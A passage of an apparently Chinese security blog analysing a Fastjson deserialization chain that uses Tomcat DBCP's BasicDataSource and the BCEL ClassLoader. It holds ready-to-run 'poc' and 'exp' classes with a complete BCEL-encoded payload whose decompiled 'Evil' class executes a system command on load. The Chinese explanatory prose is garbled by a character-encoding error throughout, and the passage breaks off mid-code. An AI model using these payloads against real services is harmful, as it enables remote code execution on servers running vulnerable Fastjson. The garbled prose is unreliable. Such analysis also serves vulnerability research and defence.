&#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Set up the driver connection factory we will use</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">user</span> <span class="operator">=</span> userName;</span><br><span class="line">        <span class="keyword">if</span> (user != <span class="literal">null</span>) &#123;</span><br><span class="line">            connectionProperties.put(<span class="string">&quot;user&quot;</span>, user);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            log(<span class="string">&quot;DBCP DataSource configured without a &#x27;username&#x27;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">pwd</span> <span class="operator">=</span> password;</span><br><span class="line">        <span class="keyword">if</span> (pwd != <span class="literal">null</span>) &#123;</span><br><span class="line">            connectionProperties.put(<span class="string">&quot;password&quot;</span>, pwd);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            log(<span class="string">&quot;DBCP DataSource configured without a &#x27;password&#x27;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">ConnectionFactory</span> <span class="variable">driverConnectionFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DriverConnectionFactory</span>(driverToUse, url,</span><br><span class="line">                connectionProperties);</span><br><span class="line">        <span class="keyword">return</span> driverConnectionFactory;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æ¥çœ‹å…³é”®éƒ¨åˆ†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (driverClassLoader == <span class="literal">null</span>) &#123;</span><br><span class="line">                            driverFromCCL = Class.forName(driverClassName);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            driverFromCCL = Class.forName(driverClassName, <span class="literal">true</span>, driverClassLoader);</span><br><span class="line">                        &#125;</span><br></pre></td></tr></table></figure><p>è‹¥å­˜åœ¨ <code>driverClassLoader</code>  åˆ™ä¼šå¯¹ç±»è¿›è¡Œåˆå§‹åŒ–</p><p>è¿™é‡Œçš„ <code>driverClassName</code>  å’Œ <code>driverClassLoader</code>  éƒ½æ˜¯å¯æ§çš„</p><p>è¿™é‡Œå°±å¯ä»¥è€ƒè™‘å°† <code>driverClassLoader</code>  çš„å‚æ•°å†™ä¸º <code>com.sun.org.apache.bcel.internal.util.ClassLoader</code></p><p>æ¥ç€</p><p>åœ¨ <code>org.apache.tomcat.dbcp.dbcp2.BasicDataSource#createDataSource()</code>  ä¸­è°ƒç”¨äº† <code>createConnectionFactory()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> DataSource <span class="title function_">createDataSource</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="keyword">if</span> (closed) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(<span class="string">&quot;Data source is closed&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Return the pool if we have already created it</span></span><br><span class="line">        <span class="comment">// This is double-checked locking. This is safe since dataSource is</span></span><br><span class="line">        <span class="comment">// volatile and the code is targeted at Java 5 onwards.</span></span><br><span class="line">        <span class="keyword">if</span> (dataSource != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> dataSource;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (dataSource != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> dataSource;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            jmxRegister();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// create factory which returns raw physical connections</span></span><br><span class="line">            <span class="keyword">final</span> <span class="type">ConnectionFactory</span> <span class="variable">driverConnectionFactory</span> <span class="operator">=</span> createConnectionFactory();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Set up the poolable connection factory</span></span><br><span class="line">            <span class="type">boolean</span> <span class="variable">success</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">            PoolableConnectionFactory poolableConnectionFactory;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                poolableConnectionFactory = createPoolableConnectionFactory(driverConnectionFactory);</span><br><span class="line">                poolableConnectionFactory.setPoolStatements(poolPreparedStatements);</span><br><span class="line">                poolableConnectionFactory.setMaxOpenPreparedStatements(maxOpenPreparedStatements);</span><br><span class="line">                success = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> SQLException se) &#123;</span><br><span class="line">                <span class="keyword">throw</span> se;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> RuntimeException rte) &#123;</span><br><span class="line">                <span class="keyword">throw</span> rte;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> Exception ex) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(<span class="string">&quot;Error creating connection factory&quot;</span>, ex);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (success) &#123;</span><br><span class="line">                <span class="comment">// create a pool for our connections</span></span><br><span class="line">                createConnectionPool(poolableConnectionFactory);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Create the pooling data source to manage connections</span></span><br><span class="line">            DataSource newDataSource;</span><br><span class="line">            success = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                newDataSource = createDataSourceInstance();</span><br><span class="line">                newDataSource.setLogWriter(logWriter);</span><br><span class="line">                success = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> SQLException se) &#123;</span><br><span class="line">                <span class="keyword">throw</span> se;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> RuntimeException rte) &#123;</span><br><span class="line">                <span class="keyword">throw</span> rte;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> Exception ex) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(<span class="string">&quot;Error creating datasource&quot;</span>, ex);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (!success) &#123;</span><br><span class="line">                    closeConnectionPool();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// If initialSize &gt; 0, preload the pool</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; initialSize; i++) &#123;</span><br><span class="line">                    connectionPool.addObject();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> Exception e) &#123;</span><br><span class="line">                closeConnectionPool();</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(<span class="string">&quot;Error preloading the connection pool&quot;</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// If timeBetweenEvictionRunsMillis &gt; 0, start the pool&#x27;s evictor task</span></span><br><span class="line">            startPoolMaintenance();</span><br><span class="line"></span><br><span class="line">            dataSource = newDataSource;</span><br><span class="line">            <span class="keyword">return</span> dataSource;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦è®©</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (dataSource != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> dataSource;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (dataSource != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> dataSource;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>å‡ä¸º false æ‰èƒ½è°ƒç”¨</p><p>æ¥ç€</p><p>åœ¨ <code>org.apache.tomcat.dbcp.dbcp2.BasicDataSource#getConnection()</code>  è°ƒç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Connection <span class="title function_">getConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="keyword">if</span> (Utils.IS_SECURITY_ENABLED) &#123;</span><br><span class="line">            <span class="keyword">final</span> PrivilegedExceptionAction&lt;Connection&gt; action = <span class="keyword">new</span> <span class="title class_">PaGetConnection</span>();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> AccessController.doPrivileged(action);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> PrivilegedActionException e) &#123;</span><br><span class="line">                <span class="keyword">final</span> <span class="type">Throwable</span> <span class="variable">cause</span> <span class="operator">=</span> e.getCause();</span><br><span class="line">                <span class="keyword">if</span> (cause <span class="keyword">instanceof</span> SQLException) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> (SQLException) cause;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> createDataSource().getConnection();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è‡³æ­¤ï¼Œé“¾å­çš„æ•´ä½“æµç¨‹</p><p><img src="https://img-blog.csdnimg.cn/1693c5418e4c430388cea181a4df746a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span> kiloã€å†°å®¤/ki10Moc</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2022/11/7</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@time</span> 14:30</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@blog</span> http://ki10.top</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastJsonBcel</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload2</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;ki10\&quot;:&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                \&quot;@type\&quot;: \&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                \&quot;driverClassLoader\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    \&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                \&quot;driverClassName\&quot;: \&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AuQ$cbN$db$40$U$3d$938$b1c$9c$e6A$D$94$a6o$k$81E$zPw$m6$V$95$aa$baM$d5$m$ba$9eL$a7a$82cG$f6$84$a6_$c4$3a$hZ$b1$e8$H$f0Q$88$3b$sM$pAG$f2$7d$ce9$f7$dc$f1$d5$f5$e5$l$Ao$b0$e1$c2$c1$b2$8b$V$3cr$b0j$fcc$hM$X$F$3c$b1$f1$d4$c63$86$e2$be$8a$94$3e$60$c8$b7$b6$8e$Z$ac$b7$f17$c9P$JT$q$3f$8d$G$5d$99$i$f1nH$95z$Q$L$k$k$f3D$99$7cZ$b4$f4$89J$Z$9a$81$88$H$fep$87$ff$dc$fd$a1$o$ff$3bOu$3f$8d$p$ff$f0L$85$7b$M$ce$be$I$a7C$Y$81$gA$9f$9fq_$c5$fe$fb$f6$e1X$c8$a1VqD$d7$ca$j$cd$c5$e9G$3e$cc$c8I$t$83$db$89G$89$90$ef$94$ZV2t$af$N$d6C$J$ae$8d$e7$k$5e$e0$r$a9$ma$c2$c3$x$ac1$y$de$c3$eda$j$$$c3$ea$ffE2T3$5c$c8$a3$9e$df$ee$f6$a5$d0$M$b5$7f$a5$_$a3H$ab$Bip$7bR$cf$92Fk$x$b8s$87$W$b1$e4X$K$86$cd$d6$5c$b7$a3$T$V$f5$f6$e6$B$9f$93X$c84$r$40eHM$9d$ad$7f$94p$ni$z$9b$7e$9c990$b3$y$d9$F$ca$7c$f2$8c$7ca$fb$X$d8$qk$7bd$8b$b7E$94$c9z$d3$f8$B$w$e4$jTg$60$9e$91$B$f5$df$c8$d5$f3$X$b0$be$9e$c3$f9$b0$7d$81$e2$q$ab$97$I$5b$40$3ec$5c$a2$c8$a0K$844$af$5d$s$96$gE$7f$t$94aQ$5e$a7l$91$3e$h$b9$c0$c6C$8b$g$8dL$d4$d2$N_$9f$94$o$82$C$A$A\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;: \&quot;Moc\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯</p><p>è¿™é‡Œ poc çš„åµŒå¥—</p><p>æœ€å <code>JSON.parse</code>  è§¦å‘ <code>key.toString()</code></p><p><img src="https://img-blog.csdnimg.cn/fb74d9af426b42988769e263895e46bb.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ•´ä¸ª poc éƒ½ä¸º <code>JSONObject</code>  ï¼Œ <code>value</code>  ä¸º <code>Moc</code></p><p>ç„¶ååˆ¤æ–­æ˜¯å¦æ˜¯ <code>JSON</code>  å¯¹è±¡ï¼Œå†å»è¯†åˆ« <code>key</code>  å’Œ <code>value</code></p><p><img src="https://img-blog.csdnimg.cn/195ff4481c6742f3a50e37cba995bd88.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è°ƒè¯•è¿‡ç¨‹ä¸­ç¡®å®ä¸¤æ¬¡è½åœ¨è¯¥æ–­ç‚¹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key = (key == <span class="literal">null</span>) ? <span class="string">&quot;null&quot;</span> : key.toString();</span><br></pre></td></tr></table></figure><p>è€Œåœ¨æ‰§è¡Œ toString () æ—¶ä¼šå°†å½“å‰ç±»è½¬ä¸ºå­—ç¬¦ä¸²å½¢å¼ï¼Œä¼šæå–ç±»ä¸­æ‰€æœ‰çš„ Fieldï¼Œæ‰§è¡Œç›¸åº”çš„ getter ã€is ç­‰æ–¹æ³•ã€‚å› æ­¤ä¹Ÿä¼šæ‰§è¡Œ getConnection æ–¹æ³•</p><p>å½“ç„¶ä»¥ä¸Šéƒ½æ˜¯å»ºç«‹åœ¨ <code>parse()</code>  æ–¹æ³•ä¹‹ä¸Š</p><p>å¦‚æœ poc æ˜¯ <code>parseObject()</code>  ï¼Œé‚£å°±ç®€å•äº†ï¼Œå› ä¸ºåœ¨å¤„ç†è¿‡ç¨‹ä¸­ä¼šè°ƒç”¨æ‰€æœ‰çš„ setter å’Œ getter æ–¹æ³•ã€‚è¯¦ç»†å¯ä»¥çœ‹ FastJson ååºåˆ—åŒ–åŸºç¡€</p><p>exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span> kiloã€å†°å®¤/ki10Moc</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2022/11/7</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@time</span> 14:30</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@blog</span> http://ki10.top</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastJsonBcel</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;               \&quot;@type\&quot;: \&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                \&quot;driverClassLoader\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    \&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                \&quot;driverClassName\&quot;: \&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AuQ$cbN$db$40$U$3d$938$b1c$9c$e6A$D$94$a6o$k$81E$zPw$m6$V$95$aa$baM$d5$m$ba$9eL$a7a$82cG$f6$84$a6_$c4$3a$hZ$b1$e8$H$f0Q$88$3b$sM$pAG$f2$7d$ce9$f7$dc$f1$d5$f5$e5$l$Ao$b0$e1$c2$c1$b2$8b$V$3cr$b0j$fcc$hM$X$F$3c$b1$f1$d4$c63$86$e2$be$8a$94$3e$60$c8$b7$b6$8e$Z$ac$b7$f17$c9P$JT$q$3f$8d$G$5d$99$i$f1nH$95z$Q$L$k$k$f3D$99$7cZ$b4$f4$89J$Z$9a$81$88$H$fep$87$ff$dc$fd$a1$o$ff$3bOu$3f$8d$p$ff$f0L$85$7b$M$ce$be$I$a7C$Y$81$gA$9f$9fq_$c5$fe$fb$f6$e1X$c8$a1VqD$d7$ca$j$cd$c5$e9G$3e$cc$c8I$t$83$db$89G$89$90$ef$94$ZV2t$af$N$d6C$J$ae$8d$e7$k$5e$e0$r$a9$ma$c2$c3$x$ac1$y$de$c3$eda$j$$$c3$ea$ffE2T3$5c$c8$a3$9e$df$ee$f6$a5$d0$M$b5$7f$a5$_$a3H$ab$Bip$7bR$cf$92Fk$x$b8s$87$W$b1$e4X$K$86$cd$d6$5c$b7$a3$T$V$f5$f6$e6$B$9f$93X$c84$r$40eHM$9d$ad$7f$94p$ni$z$9b$7e$9c990$b3$y$d9$F$ca$7c$f2$8c$7ca$fb$X$d8$qk$7bd$8b$b7E$94$c9z$d3$f8$B$w$e4$jTg$60$9e$91$B$f5$df$c8$d5$f3$X$b0$be$9e$c3$f9$b0$7d$81$e2$q$ab$97$I$5b$40$3ec$5c$a2$c8$a0K$844$af$5d$s$96$gE$7f$t$94aQ$5e$a7l$91$3e$h$b9$c0$c6C$8b$g$8dL$d4$d2$N_$9f$94$o$82$C$A$A\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/aa37b1f2217b4c569f4cc52e1c21fa59.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ä¸Šé¢æˆ‘ä»¬è¯´äº†é‚£ä¹ˆå¤šï¼ŒåŸºæœ¬å·²ç»èµ°å®Œäº†æµç¨‹ï¼Œä½†è¿˜æœ‰ä¸ªé—®é¢˜ï¼Œè¿™é‡Œçš„ <code>driverClassName</code>  åé¢çš„å€¼æ˜¯ä»€ä¹ˆ</p><p>å¯èƒ½è¿˜è¦åˆ° <code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>  å»æ‰¾ç­”æ¡ˆ</p><p>è¿™é‡Œæˆ‘ä»¬è¯´ï¼Œæˆ‘ä»¬æ˜¯é€šè¿‡ <code>loadClass</code>  ä¸‹é‡å†™çš„æ–¹æ³•æ¥æ‰§è¡Œçš„ï¼Œå…¶ä¸­æœ‰ä¸ª <code>defiClass</code>  æ˜¾ç„¶æ˜¯é€šè¿‡å­—èŠ‚ç æ¥å®ç°çš„ã€‚å†å›è¿‡å¤´çœ‹ <code>createClass</code>  ä¸­çš„ <code>Utility.*decode*</code></p><p>è¿™é‡Œæˆ‘ä»¬è¿˜åŸä¸€ä¸‹å†…å®¹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BCELDecode</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">encode</span> <span class="operator">=</span> <span class="string">&quot;$l$8b$I$A$A$A$A$A$A$A...&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] decode = Utility.decode(encode,<span class="literal">true</span>);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;DecodeClass.class&quot;</span>);</span><br><span class="line">        fileOutputStream.write(decode);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾—åˆ° <code>DecodeClass.class</code></p><p>å®é™…ä¸Šå°±æ˜¯é™æ€æ–¹æ³•é‡Œé¢æ‰§è¡Œå¼¹è®¡ç®—å™¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by Fernflower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.p1ay2win.fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Evil</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var1) &#123;</span><br><span class="line">            var1.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x04-ref"><a class="markdownIt-Anchor" href="#0x04-ref">#</a> 0x04 $ref</h2><p>fastjsonâ‰¥1.2.36</p><p>è¿™é‡Œæˆ‘ä»¬è¦è®¨è®ºçš„é—®é¢˜å°±æ˜¯ä¸Šé¢ <code>JSON.parse()</code>  å’Œ <code>JSON.parseObect()</code>  è¿™ä¸¤ç§ä¸åŒæ–¹æ³•è°ƒç”¨çš„é—®é¢˜</p><p>è¿™é‡Œç»™å‡ºå¦ä¸€ç§è§£å†³æ–¹æ³•</p><p>JSONPath</p><p><img src="https://img-blog.csdnimg.cn/de2930ecd2f74ab1830e069a9f498672.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ·»åŠ ä¾èµ–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">1.2</span><span class="number">.36</span>&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 